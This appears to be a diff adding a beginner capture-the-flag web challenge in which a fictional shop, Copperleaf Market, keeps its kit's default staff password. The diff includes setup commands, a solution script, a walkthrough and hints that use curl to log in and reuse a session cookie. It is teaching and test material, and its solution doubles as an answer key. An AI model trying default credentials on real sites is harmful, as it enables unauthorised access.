@@ -1,0 +1,70 @@
+title: Straight out of the box
+category: web
+level: Beginner
+kind: Web
+topic: Server mistakes
+teaser: the staff account still has the password it came with
+points: 45
+order: 2
+packages: httpd
+answer: flag
+var: STAFF = pick:admin|manager|owner|shopkeeper
+var: DEFPW = pick:copperleaf|changeme|welcome1|setup2026|shopkit
+
+@intro
+Copperleaf Market (http://copperleaf.example/) was set up last week from a
+ready-made shop kit. Kits come with a staff account and a starting password, and
+the kit's guide tells you to change it... if anyone reads the guide.
+
+Find the kit's guide on the shop, sign in as staff with the starting password, and
+open the staff dashboard (/admin). The staff code there is the flag.
+
+@setup
+systemctl enable --now httpd
+echo '127.0.0.1 copperleaf.example' >> /etc/hosts
+
+@web
+[ { "path": "/", "kind": "shop",
+    "settings": { "flag": "{{FLAG}}", "accounts": "{{STAFF}}|{{DEFPW}}|admin|{{STAFF}}@copperleaf.example",
+                  "docs": "Thanks for choosing ShopKit! Your shop starts with one staff account, {{STAFF}}, whose first password is {{DEFPW}}. Please change it before you open your shop." } } ]
+
+@solution
+webscan http://copperleaf.example/
+curl -s http://copperleaf.example/docs
+curl -s -d "user={{STAFF}}&pass={{DEFPW}}" http://copperleaf.example/login
+C=$(curl -s -d "user={{STAFF}}&pass={{DEFPW}}" http://copperleaf.example/login | grep -o 'session=[a-z0-9]*')
+curl -s -b "$C" http://copperleaf.example/admin
+
+@walkthrough
+webscan asks the shop for a list of common page names and reports the ones that
+exist. One of them is /docs, the kit's setup guide:
+
+    webscan http://copperleaf.example/
+    curl -s http://copperleaf.example/docs
+
+The guide names the staff account ({{STAFF}}) and its starting password
+({{DEFPW}}), which nobody changed. Sign in with curl -d (it sends form fields, the
+same as typing into the form and pressing the button):
+
+    curl -s -d "user={{STAFF}}&pass={{DEFPW}}" http://copperleaf.example/login
+
+The answer shows a session cookie. A browser keeps that cookie and sends it back
+with every page; with curl you send it yourself with -b:
+
+    curl -s -b "session=..." http://copperleaf.example/admin
+
+(or catch it in a variable: C=$(curl ... | grep -o 'session=[a-z0-9]*') and then
+curl -b "$C" ...). The dashboard shows the staff code. The fix: force a new
+password on first sign-in, and never ship the same password with every copy.
+
+@hint 2
+What to think about first: when software is installed from a kit, it often starts with a known staff account and a known password - written in its own guide for everyone to read. If nobody changed it, that password still works. So the questions are: where is the guide, and what does it say?
+
+@hint 3
+Shops often have pages that aren't in the menu. webscan tries a list of common page names (like /admin, /backup, /docs) and shows which ones exist: run webscan http://copperleaf.example/ and look at what it finds. Then read the pages that sound like instructions with curl -s followed by the address.
+
+@hint 4
+Signing in with curl: curl -s -d "user=NAME&pass=PASSWORD" http://copperleaf.example/login sends the sign-in form (-d means "send this form data"). If it works, the page shows you a cookie like session=s1234abcd. Websites use that cookie to remember who you are on the next page.
+
+@hint 6
+Near step by step: curl -s http://copperleaf.example/docs gives the staff name and starting password. Sign in with them as above, copy the session=... text from the answer, and open the dashboard with that cookie: curl -s -b "session=PASTE-IT-HERE" http://copperleaf.example/admin. The flag is the staff code on that page.
